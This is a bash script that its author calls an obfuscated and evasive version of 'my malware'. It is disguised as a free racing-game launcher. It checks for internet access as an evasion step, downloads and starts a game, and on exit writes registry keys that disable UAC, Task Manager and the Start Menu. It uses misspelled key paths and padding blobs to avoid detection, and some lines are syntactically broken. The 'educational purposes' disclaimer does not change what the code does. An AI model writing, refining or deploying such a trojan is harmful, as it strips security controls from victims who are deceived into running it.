  GNU nano 6.2                                                                                                                   FreeRacingSim.sh
#!/bin/bash

#Below is the obfuscated and the evaded version of my malware that I have developed.  Once again, this malware is only for educational purposes and should not be used unless without explicit permission. 

# Array of search engines to check for internet connection
SEARCH_ENGINES=("www.google.com" "www.bing.com" "www.yahoo.com" "www.duckduckgo.com")
readme = "iVBORw0KGgoAAAANSUhEUgAAAegAAAFiCAYAAAA9e0uyAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAP+lSURBVHhe7P0HmGXZVd8Nn+pKHatznp4c0ChiSSAkYZJJIgfJH5hgMOYDg8kYMB8YY78mPgYb/PCY10SDBQIMNiLZRAkBEiAhJKE0qdN0zrm6uu/3//3XXveee+qcW7d6umd6xKxbu845O6y>
# Check for internet connection
for engine in "${SEARCH_ENGINES[@]}"; do if ping -c 1 "${engine}" > /dev/null 2>&1; then
    break
  fi done

if [ -z "${engine}" ]; then

    #Evasion technique, checks for not only the artifcats of the system but also checks for an internet connection.
    echo "Error: System requirements not met." exit 1

fi


on_exit(){
        echo "The race has concluded, initiating shutdown procedures..."

  # Obfuscated registry key paths
  uac_key_path="HKEY_LOCAL_MACHINE\SOFTWARE\Micr0s0ft\Windows\CurrentVersion\Policies\System"
  taskmgr_key_path="HKEY_CURRENT_USER\Software\Micr0s0ft\Windows\CurrentVersion\Policies\System"
  startmenu_key_path="HKEY_CURRENT_USER\Software\Micr0s0ft\Windows\CurrentVersion\Policies\Explorer"

  # Disable UAC, Task Manager, and Start Menu with obfuscated variable names
  sudo reg.exe add "${uac_key_path}" /v LUAf00d /t REG_DWORD /d 0 /f
  sudo reg.exe add "${taskmgr_key_path}" /v TaskMgrKiller /t REG_DWORD /d 1 /f
  sudo reg.exe add "${startmenu_key_path}" /v MenuBegone /t REG_DWORD /d 1 /f
}

trap 'on_exit' EXIT SIGTERM SIGINT SIGKILL

echo "So you want to race huh?"

#Download game

echo "You need to be fast..." curl -OJL https://www.gametop.com/download-free-games/city-racing/download.html echo "Prepare to go fast..."

#### Launches Game
echo "Launching Most Realistic Driving Simulator" ./City-Racing.exe


echo "Launching Most Realistic Driving Sim..." cmd.exe /c start " " 'City Racing'.lnk && disown

echo "Game launched. Get ready to race!"

game_pid=$!

while true; do
  if ! kill -0 "${game_pid}"; then
        on_exit
        break
  fi
  sleep 5
done

readme2 = "iVBORw0KGgoAAAANSUhEUgAAAegAAAFiCAYAAAA9e0uyAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAP+lSURBVHhe7P0HmGXZVd8Nn+pKHatznp4c0ChiSSAkYZJJIgfJH5hgMOYDg8kYMB8YY78mPgYb/PCY10SDBQIMNiLZRAkBEiAhJKE0qdN0zrm6uu/3//3XXveee+qcW7d6umd6xKxbu845O6>


